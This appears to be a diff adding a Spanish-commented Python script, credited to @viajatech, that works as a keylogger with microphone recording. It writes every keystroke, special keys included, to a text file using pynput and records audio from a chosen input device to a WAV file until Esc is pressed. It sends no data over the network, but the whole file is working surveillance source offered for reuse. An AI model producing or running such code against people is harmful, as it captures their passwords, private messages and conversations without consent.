@@ -1,0 +1,95 @@
+#Version; Guarda Audio y Texto al mismo tiempo.
+#Por David Ruiz
+#Esta versión es una prueba demo de como el script puede detectar cada tecla que presionas.
+#redes sociales @viajatech
+#Puedes usar mi script siempre y cuando me des créditos en mis redes sociales
+#Recuerda importar la libreria pynput y sounddevice soundfile
+#pip install sounddevice soundfile
+
+
+
+
+import os
+import threading
+import sounddevice as sd
+import soundfile as sf
+from pynput import keyboard
+
+# Nombre del archivo donde se guardarán las teclas presionadas
+filename = 'teclado_by_viajatech.txt'
+audio_filename = 'audio_by_viajatech.wav'
+
+# Configuración de grabación
+channels = 1  # Número de canales
+rate = 44100  # Tasa de muestreo (samples per second)
+stop_recording = False
+device_index = None
+audio_frames = []  # Lista para almacenar los frames de audio
+
+def list_audio_devices():
+    global device_index
+    print("Dispositivos de entrada de audio disponibles:")
+    devices = sd.query_devices()
+    for i, device in enumerate(devices):
+        print(f"Device {i}: {device['name']}")
+        if 'Razer Seiren Mini' in device['name']:
+            device_index = i
+
+def record_audio():
+    global stop_recording, audio_frames
+    if device_index is None:
+        print("No se encontró el dispositivo de entrada adecuado.")
+        return
+
+    print("Grabando...")
+
+    def callback(indata, frames, time, status):
+        if stop_recording:
+            raise sd.CallbackStop
+        audio_frames.append(indata.copy())
+
+    try:
+        with sf.SoundFile(audio_filename, mode='x', samplerate=rate, channels=channels) as file:
+            with sd.InputStream(samplerate=rate, device=device_index, channels=channels, callback=callback):
+                while not stop_recording:
+                    sd.sleep(1000)
+            for frame in audio_frames:
+                file.write(frame)
+        print(f'El archivo de audio se guarda en: {os.path.abspath(audio_filename)}')
+    except Exception as e:
+        print(f"Error durante la grabación: {e}")
+
+# Función para manejar las teclas presionadas
+def on_press(key):
+    try:
+        with open(filename, 'a') as f:
+            f.write(key.char)
+        print(f'Tecla presionada: {key.char}')
+    except AttributeError:
+        with open(filename, 'a') as f:
+            f.write(f'[{key}]')
+        print(f'Tecla especial presionada: {key}')
+
+def on_release(key):
+    global stop_recording
+    if key == keyboard.Key.esc:
+        stop_recording = True
+        return False
+
+# Listar los dispositivos de audio disponibles
+list_audio_devices()
+
+# Iniciar la grabación de audio en un hilo separado
+if device_index is not None:
+    audio_thread = threading.Thread(target=record_audio)
+    audio_thread.start()
+else:
+    print("No se encontró un dispositivo de entrada adecuado. No se iniciará la grabación de audio.")
+
+# Iniciar el listener del teclado
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+# Esperar a que se termine el hilo de grabación de audio
+if device_index is not None:
+    audio_thread.join()
